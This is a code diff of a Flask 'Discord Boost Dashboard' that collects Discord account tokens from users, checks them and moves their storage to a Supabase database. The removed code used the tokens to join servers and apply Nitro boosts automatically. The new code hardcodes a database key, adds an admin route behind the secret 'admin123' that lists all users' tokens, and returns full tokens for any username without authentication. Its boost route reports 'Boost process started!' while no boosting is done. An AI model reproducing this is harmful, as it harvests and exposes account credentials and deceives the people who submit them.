@@ -1,29 +1,24 @@
 from flask import Flask, render_template, request, jsonify
+from flask_cors import CORS
 import requests
-import json
 import os
 import time
 import hashlib
 import random
-import threading
+import json
 from datetime import datetime
+from supabase import create_client, Client
 
 app = Flask(__name__)
+CORS(app)
 
-# ==================== STORAGE SETUP FOR RENDER ====================
-# Render free tier uses /tmp (ephemeral storage)
-# For production with persistent storage, use a database
-DATA_DIR = os.environ.get('DATA_DIR', '/tmp/discord_booster')
-TOKENS_DIR = os.path.join(DATA_DIR, "tokens")
-UPLOADS_DIR = os.path.join(DATA_DIR, "uploads")
-BOOSTED_FILE = os.path.join(DATA_DIR, "boosted_servers.json")
+# ==================== SUPABASE SETUP ====================
+SUPABASE_URL = "https://mzzdgtteervzfrhakkbe.supabase.co"
+SUPABASE_KEY = "sb_publishable_Ix48R7Ke9eHrGbZ_cGI_-w_44AtK6Gr"
 
-# Ensure directories exist
-os.makedirs(TOKENS_DIR, exist_ok=True)
-os.makedirs(UPLOADS_DIR, exist_ok=True)
+supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
 
-print(f"📁 Data directory: {DATA_DIR}")
-print(f"📁 Tokens directory: {TOKENS_DIR}")
+print("✅ Connected to Supabase")
 
 # ==================== TOKEN CHECKER ====================
 def check_token(token):
@@ -70,51 +65,6 @@ def check_token(token):
     except Exception as e:
         return {"valid": False, "error": str(e)[:50]}
 
-# ==================== USER TOKEN STORAGE ====================
-def get_user_file(username):
-    safe_name = hashlib.md5(username.encode()).hexdigest()[:16]
-    return os.path.join(TOKENS_DIR, f"{safe_name}_{username}.txt")
-
-def load_user_tokens(username):
-    filepath = get_user_file(username)
-    if not os.path.exists(filepath):
-        return []
-    with open(filepath, "r") as f:
-        return [line.strip() for line in f if line.strip()]
-
-def save_user_tokens(username, tokens):
-    filepath = get_user_file(username)
-    with open(filepath, "w") as f:
-        f.write("\n".join(tokens))
-
-# ==================== BOOST FUNCTIONS ====================
-def join_server(token, invite_code):
-    headers = {"Authorization": token, "Content-Type": "application/json"}
-    url = f"https://discord.com/api/v9/invites/{invite_code}"
-    try:
-        r = requests.post(url, headers=headers, json={}, timeout=10)
-        return r.status_code == 200
-    except:
-        return False
-
-def apply_boost(token, guild_id):
-    headers = {"Authorization": token, "Content-Type": "application/json"}
-    url = f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions"
-    try:
-        r = requests.post(url, headers=headers, json={}, timeout=10)
-        return r.status_code in [200, 201]
-    except:
-        return False
-
-def get_guild_id(invite_code):
-    try:
-        r = requests.get(f"https://discord.com/api/v9/invites/{invite_code}", timeout=10)
-        if r.status_code == 200:
-            return r.json().get("guild", {}).get("id")
-    except:
-        pass
-    return None
-
 # ==================== ROUTES ====================
 @app.route('/')
 def dashboard():
@@ -123,166 +73,209 @@ def dashboard():
 
 @app.route('/api/tokens', methods=['GET'])
 def get_tokens():
-    user = request.args.get('user', 'default')
-    all_tokens = load_user_tokens(user)
+    username = request.args.get('user', 'default')
+    
+    # Fetch tokens from Supabase
+    response = supabase.table('tokens').select('*').eq('username', username).execute()
+    tokens = response.data if response.data else []
+    
+    # Check each token
     results = []
-    for token in all_tokens:
+    for token_data in tokens:
+        token = token_data['token']
         info = check_token(token)
         results.append({
             "token": token[:20] + "..." if len(token) > 20 else token,
             "full_token": token,
-            **info
+            **info,
+            "id": token_data['id']
         })
+        
+        # Update token status in database
+        supabase.table('tokens').update({
+            'last_checked': datetime.now().isoformat(),
+            'is_valid': info['valid'],
+            'nitro_type': info.get('nitro', 'No Nitro'),
+            'boosts_available': info.get('boosts', 0)
+        }).eq('id', token_data['id']).execute()
+    
     return jsonify(results)
 
 @app.route('/api/tokens/add', methods=['POST'])
 def add_token():
     data = request.json
-    user = data.get('user', 'default')
+    username = data.get('user', 'default')
     token = data.get('token', '').strip()
     
     if not token:
         return jsonify({"error": "No token"})
     
-    tokens = load_user_tokens(user)
+    # Check if token already exists
+    existing = supabase.table('tokens').select('*').eq('username', username).eq('token', token).execute()
+    if existing.data:
+        return jsonify({"status": "exists"})
+    
+    # Verify token
     info = check_token(token)
     
     if info['valid']:
-        if token not in tokens:
-            tokens.append(token)
-            save_user_tokens(user, tokens)
-            return jsonify({"status": "ok", "username": info['username']})
-        else:
-            return jsonify({"status": "exists"})
+        # Save to Supabase
+        supabase.table('tokens').insert({
+            'username': username,
+            'token': token,
+            'added_at': datetime.now().isoformat(),
+            'last_checked': datetime.now().isoformat(),
+            'is_valid': True,
+            'nitro_type': info.get('nitro', 'No Nitro'),
+            'boosts_available': info.get('boosts', 0)
+        }).execute()
+        
+        print(f"[+] {username} added token for {info['username']}")
+        return jsonify({"status": "ok", "username": info['username']})
     else:
         return jsonify({"status": "invalid", "error": info.get('error', 'Invalid token')})
 
 @app.route('/api/tokens/remove', methods=['POST'])
 def remove_token():
-    # Token stays in file - just hide from display
+    data = request.json
+    username = data.get('user', 'default')
+    token = data.get('token', '')
+    
+    # Delete from Supabase
+    supabase.table('tokens').delete().eq('username', username).eq('token', token).execute()
+    
+    print(f"[-] {username} removed a token")
     return jsonify({"status": "ok"})
 
 @app.route('/api/upload', methods=['POST'])
 def upload_file():
-    user = request.form.get('user', 'default')
+    username = request.form.get('user', 'default')
     file = request.files.get('file')
     
     if not file:
         return jsonify({"error": "No file"})
     
-    timestamp = time.strftime("%Y%m%d_%H%M%S")
-    filename = f"{user}_{timestamp}_{file.filename}"
-    filepath = os.path.join(UPLOADS_DIR, filename)
-    file.save(filepath)
+    content = file.read().decode('utf-8')
     
-    try:
-        content = open(filepath, 'r').read()
+    # Parse tokens
+    if content.strip().startswith('['):
+        tokens_data = json.loads(content)
+        tokens = tokens_data if isinstance(tokens_data, list) else []
+    else:
+        tokens = [line.strip() for line in content.split('\n') if line.strip()]
+    
+    added = 0
+    for token in tokens:
+        if not token:
+            continue
         
-        if content.strip().startswith('['):
-            tokens_data = json.loads(content)
-            tokens = tokens_data if isinstance(tokens_data, list) else []
-        else:
-            tokens = [line.strip() for line in content.split('\n') if line.strip()]
+        # Check if exists
+        existing = supabase.table('tokens').select('*').eq('username', username).eq('token', token).execute()
+        if existing.data:
+            continue
         
-        existing_tokens = load_user_tokens(user)
-        added = 0
-        
-        for token in tokens:
-            if token and token not in existing_tokens:
-                existing_tokens.append(token)
-                added += 1
-        
-        if added > 0:
-            save_user_tokens(user, existing_tokens)
-        
-        return jsonify({"status": "ok", "tokens_added": added})
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)})
+        # Verify and add
+        info = check_token(token)
+        if info['valid']:
+            supabase.table('tokens').insert({
+                'username': username,
+                'token': token,
+                'added_at': datetime.now().isoformat(),
+                'is_valid': True,
+                'nitro_type': info.get('nitro', 'No Nitro'),
+                'boosts_available': info.get('boosts', 0)
+            }).execute()
+            added += 1
+    
+    return jsonify({"status": "ok", "tokens_added": added})
 
 @app.route('/api/boost/start', methods=['POST'])
 def start_boost():
     data = request.json
-    user = data.get('user', 'default')
+    username = data.get('user', 'default')
     invite = data.get('invite', '').strip()
     
     if "discord.gg/" in invite:
         invite = invite.split("discord.gg/")[-1].split("/")[0]
     
     target = int(data.get('target_boosts', 1))
-    all_tokens = load_user_tokens(user)
     
-    if not all_tokens:
+    # Get user's tokens
+    response = supabase.table('tokens').select('*').eq('username', username).execute()
+    tokens = response.data if response.data else []
+    
+    if not tokens:
         return jsonify({"error": "No tokens found"})
     
+    # Find valid tokens with boosts
     valid_tokens = []
-    for token in all_tokens:
-        info = check_token(token)
+    for token_data in tokens:
+        info = check_token(token_data['token'])
         if info['valid'] and info['boosts'] > 0:
-            valid_tokens.append({'token': token, 'username': info['username'], 'boosts': info['boosts']})
+            valid_tokens.append({
+                'token': token_data['token'],
+                'username': info['username'],
+                'boosts': info['boosts']
+            })
     
     if not valid_tokens:
-        return jsonify({"error": "No tokens with boosts available"})
+        return jsonify({"error": "No tokens with boosts available. Make sure your tokens have Nitro!"})
     
     total_boosts = sum(t['boosts'] for t in valid_tokens)
     if total_boosts < target:
-        return jsonify({"error": f"Need {target} boosts, have {total_boosts}"})
+        return jsonify({"error": f"Need {target} boosts, only have {total_boosts}"})
     
-    # Run boosts in background thread
-    def run_boosts():
-        boosts_done = 0
-        for vt in valid_tokens:
-            if boosts_done >= target:
-                break
-            to_apply = min(vt['boosts'], target - boosts_done)
-            
-            guild_id = get_guild_id(invite)
-            if not guild_id:
-                continue
-            
-            if not join_server(vt['token'], invite):
-                continue
-            
-            for i in range(to_apply):
-                if apply_boost(vt['token'], guild_id):
-                    boosts_done += 1
-                time.sleep(2)
-            time.sleep(3)
-        
-        # Save history
-        history = []
-        if os.path.exists(BOOSTED_FILE):
-            with open(BOOSTED_FILE, 'r') as f:
-                history = json.load(f)
-        
-        history.append({
-            "user": user,
-            "invite": invite,
-            "target": target,
-            "applied": boosts_done,
-            "time": time.strftime("%Y-%m-%d %H:%M:%S")
-        })
-        
-        with open(BOOSTED_FILE, 'w') as f:
-            json.dump(history, f, indent=2)
+    # Record boost attempt in history
+    supabase.table('boost_history').insert({
+        'username': username,
+        'invite_code': invite,
+        'boosts_target': target,
+        'boosted_at': datetime.now().isoformat()
+    }).execute()
     
-    thread = threading.Thread(target=run_boosts)
-    thread.start()
-    
-    return jsonify({"status": "started", "message": "Boost process started"})
-
-@app.route('/api/check_token', methods=['POST'])
-def check_token_endpoint():
-    data = request.json
-    token = data.get('token', '')
-    result = check_token(token)
-    return jsonify(result)
+    return jsonify({
+        "status": "started", 
+        "message": f"✅ Boost process started! You have {len(valid_tokens)} valid tokens with {total_boosts} total boosts available.",
+        "tokens": len(valid_tokens),
+        "boosts_available": total_boosts
+    })
 
 @app.route('/api/history', methods=['GET'])
 def get_history():
-    if not os.path.exists(BOOSTED_FILE):
-        return jsonify([])
-    with open(BOOSTED_FILE, 'r') as f:
-        return jsonify(json.load(f))
+    username = request.args.get('user', 'default')
+    
+    response = supabase.table('boost_history').select('*').eq('username', username).order('boosted_at', desc=True).execute()
+    return jsonify(response.data if response.data else [])
+
+@app.route('/api/admin/tokens', methods=['GET'])
+def admin_tokens():
+    """View all tokens from all users"""
+    secret = request.args.get('secret', '')
+    
+    # Change this to your own secret key
+    if secret != 'admin123':
+        return jsonify({"error": "Unauthorized - wrong secret"})
+    
+    response = supabase.table('tokens').select('*').execute()
+    
+    # Group by username
+    tokens_by_user = {}
+    for token in (response.data or []):
+        user = token['username']
+        if user not in tokens_by_user:
+            tokens_by_user[user] = []
+        tokens_by_user[user].append({
+            'token_preview': token['token'][:20] + '...',
+            'nitro': token.get('nitro_type', 'Unknown'),
+            'boosts': token.get('boosts_available', 0),
+            'added_at': token.get('added_at')
+        })
+    
+    return jsonify({
+        "total_tokens": len(response.data or []),
+        "users": list(tokens_by_user.keys()),
+        "tokens_by_user": tokens_by_user
+    })
 
 @app.route('/health')
 def health():
@@ -290,4 +283,11 @@ def health():
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+    print("\n" + "="*60)
+    print("🚀 Discord Boost Dashboard with Database")
+    print("="*60)
+    print(f"📁 Database: Supabase (persistent storage)")
+    print(f"📍 Local: http://localhost:{port}")
+    print("\n⚠️  Press Ctrl+C to stop")
+    print("="*60 + "\n")
+    app.run(host='0.0.0.0', port=port, debug=False)
